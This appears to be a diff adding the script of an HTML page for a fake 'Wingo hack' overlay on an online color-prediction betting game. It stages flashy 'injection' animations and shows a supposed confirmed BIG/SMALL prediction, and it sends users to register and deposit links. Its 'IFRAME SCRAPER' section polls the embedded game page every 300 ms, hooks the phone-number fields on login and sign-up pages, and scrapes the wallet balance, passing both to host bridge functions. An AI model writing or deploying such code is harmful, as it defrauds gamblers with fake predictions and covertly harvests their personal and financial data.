+function showResult(r){
+  if (rouletteTimer) { clearInterval(rouletteTimer); rouletteTimer = null; }
+  coinSide.classList.remove('khatarnak-scan');
+  if (stageWrapper) stageWrapper.classList.remove('chassis-overdrive');
+  if (stage) stage.classList.remove('stage-overdrive');
+
+  currentSyncPct = 100;
+  if (syncFill) syncFill.style.width = '100%';
+  if (syncPct) syncPct.innerText = '100%';
+  [syncDot25, syncDot50, syncDot75, syncDot100].forEach(function(d){ if (d) d.classList.add('active'); });
+
+  setBallNumber(r.num);
+  if (periodNum) periodNum.innerText = r.period;
+  if (sigText) sigText.innerText = r.bs + ' CONFIRMED';
+
+  if (supernovaFlash) {
+    supernovaFlash.classList.remove('active'); void supernovaFlash.offsetWidth;
+    supernovaFlash.classList.add('active');
+  }
+  if (empShockwave) {
+    empShockwave.classList.remove('blast'); void empShockwave.offsetWidth;
+    empShockwave.classList.add('blast');
+  }
+  if (empShockwave2) {
+    empShockwave2.classList.remove('blast'); void empShockwave2.offsetWidth;
+    empShockwave2.classList.add('blast');
+  }
+  if (coinBall) {
+    coinBall.classList.remove('coin-quantum-slam'); void coinBall.offsetWidth;
+    coinBall.classList.add('coin-quantum-slam');
+  }
+  if (sparkContainer) {
+    sparkContainer.innerHTML = '';
+    var sparkColors = ['#C026FF', '#F05BFF', '#7900FF', '#ffffff', '#e085ff', '#9d4edd'];
+    for (var i = 0; i < 24; i++) {
+      var sp = document.createElement('div');
+      sp.className = 'spark-particle';
+      var angle = (i / 24) * Math.PI * 2;
+      var dist = 38 + Math.random() * 28;
+      sp.style.setProperty('--tx', 'calc(-50% + ' + (Math.cos(angle) * dist) + 'px)');
+      sp.style.setProperty('--ty', 'calc(-50% + ' + (Math.sin(angle) * dist) + 'px)');
+      sp.style.color = sparkColors[i % sparkColors.length];
+      sp.style.background = sparkColors[i % sparkColors.length];
+      sparkContainer.appendChild(sp);
+    }
+  }
+  if (sizeBtn) { sizeBtn.classList.remove('size-punch'); void sizeBtn.offsetWidth; sizeBtn.classList.add('size-punch'); }
+  if (periodNum) { periodNum.classList.remove('period-flash'); void periodNum.offsetWidth; periodNum.classList.add('period-flash'); }
+
+  wingoHackDone = true;
+  isWorking = false;
+  startBtn.innerText = 'RE-EXECUTE';
+  startBtn.disabled = false;
+  startBtn.onclick = runInjection;
+
+  playAudio(r.bs === 'BIG' ? 'big.mp3' : 'small.mp3');
+  try { window.ZAYRO.speak(r.bs + ' ' + r.num); } catch(e){}
+}
+
+/* ══════════════════════════════════════════════════════════════════
+   BUTTON HANDLERS
+══════════════════════════════════════════════════════════════════ */
+attachBtnHandler('warnRegBtn', function(){ hideWarnOverlay(); navTo(REGISTER_URL); });
+attachBtnHandler('btnRegister', function(){ hideWarnOverlay(); navTo(REGISTER_URL); });
+attachBtnHandler('btnDeposit', function(){ navTo(DEPOSIT_URL); });
+
+/* HIDE handler — shared for all 3 views */
+function handleHideClick(){
+  closeCard();
+  if (wingoHackDone) {
+    wingoHackDone = false;
+    lockedPrediction = null;
+    lockedPeriod = null;
+  }
+}
+attachBtnHandler('spd-hide', handleHideClick);       // main view HIDE
+attachBtnHandler('btnHideAuth', handleHideClick);     // auth view ✕
+attachBtnHandler('btnHideLocked', handleHideClick);   // locked view ✕
+
+/* ══════════════════════════════════════════════════════════════════
+   CYBER MATRIX RAIN
+══════════════════════════════════════════════════════════════════ */
+(function initCyberRain(){
+  var canvas = document.getElementById("rainCanvas");
+  if (!canvas) return;
+  var ctx = canvas.getContext("2d");
+  var W = 180, H = 220;
+  canvas.width = W; canvas.height = H;
+
+  var SYMBOLS = ['0','1','7','9','3','5','8','⚡','✦','◈','◆','⬡','★','₿','$','₹','€','¥','0x','W','Z'];
+  var COLORS = ['#C026FF','#F05BFF','#7900FF','#ffffff','#e085ff','#a855f7'];
+  var drops = [];
+  var dropCount = 56;
+
+  for (var i = 0; i < dropCount; i++) {
+    var randType = Math.random();
+    drops.push({
+      x: Math.random() * W, y: Math.random() * H,
+      speed: 1.2 + Math.random() * 2.2,
+      length: 12 + Math.random() * 18,
+      type: randType < 0.42 ? 'char' : (randType < 0.72 ? 'streak' : 'coin'),
+      char: SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)],
+      color: COLORS[Math.floor(Math.random() * COLORS.length)],
+      size: 8 + Math.random() * 4,
+      opacity: 0.65 + Math.random() * 0.35,
+      changeRate: 0.04 + Math.random() * 0.08
+    });
+  }
+
+  function drawRain(){
+    ctx.clearRect(0, 0, W, H);
+    var isOverdrive = isWorking;
+    for (var i = 0; i < drops.length; i++) {
+      var d = drops[i];
+      var spd = isOverdrive ? d.speed * 1.6 : d.speed;
+      d.y += spd;
+      if (d.y > H + 20) {
+        d.y = -18; d.x = Math.random() * W;
+        d.char = SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)];
+        d.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+        d.speed = 1.2 + Math.random() * 2.2;
+      }
+      if (Math.random() < d.changeRate) d.char = SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)];
+
+      ctx.save();
+      ctx.globalAlpha = isOverdrive ? 1 : d.opacity;
+
+      if (d.type === 'char') {
+        ctx.font = 'bold ' + d.size + "px 'Orbitron', monospace";
+        ctx.fillStyle = d.color;
+        ctx.shadowColor = d.color;
+        ctx.shadowBlur = isOverdrive ? 12 : 7;
+        ctx.fillText(d.char, d.x, d.y);
+      } else if (d.type === 'streak') {
+        var grad = ctx.createLinearGradient(d.x, d.y - d.length, d.x, d.y);
+        grad.addColorStop(0, 'transparent');
+        grad.addColorStop(0.7, d.color);
+        grad.addColorStop(1, '#ffffff');
+        ctx.strokeStyle = grad;
+        ctx.lineWidth = 1.4;
+        ctx.shadowColor = d.color;
+        ctx.shadowBlur = 8;
+        ctx.beginPath(); ctx.moveTo(d.x, d.y - d.length); ctx.lineTo(d.x, d.y); ctx.stroke();
+        ctx.fillStyle = '#ffffff';
+        ctx.beginPath(); ctx.arc(d.x, d.y, 1.2, 0, Math.PI * 2); ctx.fill();
+      } else {
+        ctx.fillStyle = d.color;
+        ctx.shadowColor = d.color;
+        ctx.shadowBlur = isOverdrive ? 14 : 9;
+        ctx.beginPath(); ctx.arc(d.x, d.y, 2.2, 0, Math.PI * 2); ctx.fill();
+        ctx.strokeStyle = d.color;
+        ctx.lineWidth = 1.2;
+        ctx.beginPath(); ctx.moveTo(d.x, d.y - 8); ctx.lineTo(d.x, d.y); ctx.stroke();
+      }
+      ctx.restore();
+    }
+    requestAnimationFrame(drawRain);
+  }
+  drawRain();
+})();
+
+/* Coin tap */
+coinBall.addEventListener('click', function(){
+  coinBall.style.transform = 'scale(1.12) rotate(15deg)';
+  setTimeout(function(){ coinBall.style.transform = ''; }, 250);
+});
+
+/* Ping flicker */
+setInterval(function(){
+  if (opened && pingVal) pingVal.innerText = (18 + Math.floor(Math.random() * 9)) + 'MS';
+}, 1500);
+
+
+/* ══════════════════════════════════════════════════════════════════
+   ROCK SOLID DRAG & TAP ENGINE (Galaxy Vision Standard)
+══════════════════════════════════════════════════════════════════ */
+function openCard(){
+  if(opened) return;
+  opened = true;
+  var miniEl = document.getElementById("mini");
+  var stageEl = document.getElementById("stage");
+  if(miniEl) miniEl.style.display = 'none';
+  if(stageEl){
+    stageEl.style.display = 'block';
+    stageEl.classList.remove('spd-close');
+    stageEl.classList.add('spd-open');
+  }
+  isOnWingoPage = true;
+  userRegistered = true;
+  goState('wingo');
+  updateUI();
+  try { reportArea(); } catch(e){}
+}
+
+function closeCard(){
+  if(!opened) return;
+  opened = false;
+  var miniEl = document.getElementById("mini");
+  var stageEl = document.getElementById("stage");
+  if(stageEl){
+    stageEl.classList.remove('spd-open');
+    stageEl.classList.add('spd-close');
+  }
+  if(miniEl) miniEl.style.display = 'flex';
+  setTimeout(function(){
+    if(!opened && stageEl){
+      stageEl.style.display = 'none';
+      stageEl.classList.remove('spd-close');
+    }
+  }, 220);
+  try { reportArea(); } catch(e){}
+}
+
+function makeDraggable(el, clickCallback){
+  var sx = 0, sy = 0, ox = 0, oy = 0, isDragging = false, hasMoved = false;
+  function start(e){
+    if(e.target && e.target.closest && e.target.closest('button')) return;
+    if(e.target && e.target.tagName && e.target.tagName.toLowerCase() === 'button') return;
+    var p = e.touches ? e.touches[0] : e;
+    sx = p.clientX; sy = p.clientY;
+    var comp = window.getComputedStyle(el);
+    ox = parseInt(comp.left, 10); oy = parseInt(comp.top, 10);
+    if(isNaN(ox)) ox = el.offsetLeft || 0;
+    if(isNaN(oy)) oy = el.offsetTop || 0;
+    isDragging = true; hasMoved = false;
+    el.style.transition = 'none';
+    if(el.id === 'mini'){ el.style.animation = 'none'; }
+  }
+  function move(e){
+    if(!isDragging) return;
+    var p = e.touches ? e.touches[0] : e;
+    var dx = p.clientX - sx, dy = p.clientY - sy;
+    if(Math.abs(dx) > 5 || Math.abs(dy) > 5) hasMoved = true;
+    el.style.left = Math.max(4, Math.min(window.innerWidth - el.offsetWidth - 4, ox + dx)) + 'px';
+    el.style.top = Math.max(4, Math.min(window.innerHeight - el.offsetHeight - 4, oy + dy)) + 'px';
+    if(e.cancelable) e.preventDefault();
+  }
+  function end(){
+    if(!isDragging) return;
+    isDragging = false;
+    el.style.transition = '';
+    if(el.id === 'mini'){ el.style.animation = 'fab-float 3.4s ease-in-out infinite'; }
+    if(!hasMoved && typeof clickCallback === 'function') clickCallback();
+  }
+  el.addEventListener('touchstart', start, {passive: true});
+  el.addEventListener('mousedown', start, false);
+  document.addEventListener('touchmove', move, {passive: false});
+  document.addEventListener('mousemove', move, false);
+  document.addEventListener('touchend', end);
+  document.addEventListener('mouseup', end);
+}
+
+makeDraggable(mini, openCard);
+makeDraggable(stage, null);
+
+/* ══════════════════════════════════════════════════════════════════
+   IFRAME SCRAPER
+══════════════════════════════════════════════════════════════════ */
+var _lastScrapedUrl = "";
+var _lastScrapedBalance = "";
+var _lastScrapedPhone = "";
+
+setInterval(function(){
+  try {
+    var fWin = gameFrame.contentWindow;
+    var fDoc = gameFrame.contentDocument || fWin.document;
+    if (!fWin || !fDoc) return;
+
+    var currentIframeUrl = "";
+    try { currentIframeUrl = fWin.location.href || ""; } catch(e){}
+
+    if (currentIframeUrl !== _lastScrapedUrl && currentIframeUrl !== "about:blank") {
+      _lastScrapedUrl = currentIframeUrl;
+      window.setUrl(currentIframeUrl);
+    }
+
+    var uUrl = currentIframeUrl.toLowerCase();
+    var isReg = uUrl.indexOf('register') >= 0 || uUrl.indexOf('invitationcode') >= 0 || uUrl.indexOf('invitecode') >= 0;
+    var isLog = (uUrl.indexOf('/login') >= 0 || uUrl.indexOf('login') >= 0) && !isReg;
+
+    if (isLog || isReg) {
+      var pinp = fDoc.querySelector('input[placeholder*="phone"]') ||
+                 fDoc.querySelector('input[placeholder*="Phone"]') ||
+                 fDoc.querySelector('input[placeholder*="mobile"]') ||
+                 fDoc.querySelector('input[placeholder*="Mobile"]') ||
+                 fDoc.querySelector('input[type="tel"]') ||
+                 fDoc.querySelector('input[type="number"]') ||
+                 fDoc.querySelector('input[name="userNumber"]');
+      if (pinp && !pinp.dataset.hooked) {
+        pinp.dataset.hooked = 'true';
+        var handler = function(e){
+          var val = e.target.value.replace(/[^0-9+]/g, '');
+          if (val.length >= 10 && val !== _lastScrapedPhone) {
+            _lastScrapedPhone = val;
+            window.setPhone(val);
+          }
+        };
+        pinp.addEventListener('input', handler);
+        pinp.addEventListener('blur', handler);
+      }
+    }
+
+    var balText = "";
+    var balEl = fDoc.querySelector(
+      '.balance, .wallet-balance, [class*="balance" i], [id*="balance" i], ' +
+      '.money, .amount, .wallet-amount, [class*="amount" i], ' +
+      '.user-balance, .header-balance, .balance-num, .txt-money, .num-money, ' +
+      '.amount .a1 .a, .gameHeader__C-balance span, .gameHeader__C-balance, ' +
+      '.Wallet__C-balance-l1 span, .Wallet__C-balance-l1, .walletInfo__C-balance span, ' +
+      '.walletInfo__C-balance, .headerInfo__C-right span, .header__money span, ' +
+      '.header-money span, .top-bar__balance span, .userInfo__C-balance span, ' +
+      '.balance-amount, .my-amount'
+    );
+    if (balEl) {
+      balText = (balEl.innerText || balEl.textContent || balEl.value || balEl.getAttribute('data-amount') || balEl.getAttribute('data-balance') || "").trim();
+    }
+    if (!balText || !balText.match(/\d/)) {
+      var allSpans = fDoc.querySelectorAll('span, div, p, b, strong');
+      for (var bi = 0; bi < allSpans.length; bi++) {
+        var stxt = (allSpans[bi].innerText || allSpans[bi].textContent || "").trim();
+        if (/^(?:₹|Rs\.?|\$)\s*[\d,]+(?:\.\d{1,2})?$/.test(stxt)) {
+          balText = stxt; break;
+        }
+      }
+    }
+    if (balText) {
+      var cleanBal = balText.replace(/[₹,\s]/g, '').replace(/[^0-9.]/g, '');
+      if (cleanBal && cleanBal !== '0' && cleanBal !== _lastScrapedBalance && /[0-9]/.test(cleanBal)) {
+        _lastScrapedBalance = cleanBal;
+        window.setBalance(cleanBal);
+      }
+    }
+
+    var phoneEl = fDoc.querySelector(
+      '.user-phone, .phone, [class*="phone" i], [class*="mobile" i], [id*="phone" i], [id*="mobile" i]'
+    );
+    if (phoneEl) {
+      var pText = (phoneEl.innerText || phoneEl.textContent || "").trim().replace(/[^\d]/g, '');
+      if (pText.length >= 10 && pText !== _lastScrapedPhone) {
+        _lastScrapedPhone = pText;
+        window.setPhone(pText);
+      }
+    }
+  } catch(e){}
+}, 300);
+
+/* ══════════════════════════════════════════════════════════════════
+   BOOTSTRAP
+══════════════════════════════════════════════════════════════════ */
+window.onload = function(){
+  isOnWingoPage = true;
+  userRegistered = true;
+  goState('wingo');
+  fetchPeriod();
+  setInterval(fetchPeriod, 2500);
+};
+
+// Direct button actions for HIDE and EXECUTE
+(function bindButtonActions(){
+  var spdHide = document.getElementById('spd-hide');
+  if (spdHide) {
+    spdHide.onclick = function(e){ if(e) { e.preventDefault(); e.stopPropagation(); } closeCard(); };
+  }
+  var btnHideA = document.getElementById('btnHideAuth');
+  if (btnHideA) {
+    btnHideA.onclick = function(e){ if(e) { e.preventDefault(); e.stopPropagation(); } closeCard(); };
+  }
+  var btnHideL = document.getElementById('btnHideLocked');
+  if (btnHideL) {
+    btnHideL.onclick = function(e){ if(e) { e.preventDefault(); e.stopPropagation(); } closeCard(); };
+  }
+  var spdStart = document.getElementById('spd-start');
+  if (spdStart) {
+    spdStart.onclick = function(e){ runInjection(); };
+  }
+})();
+
+</script>
+</body>
+</html>
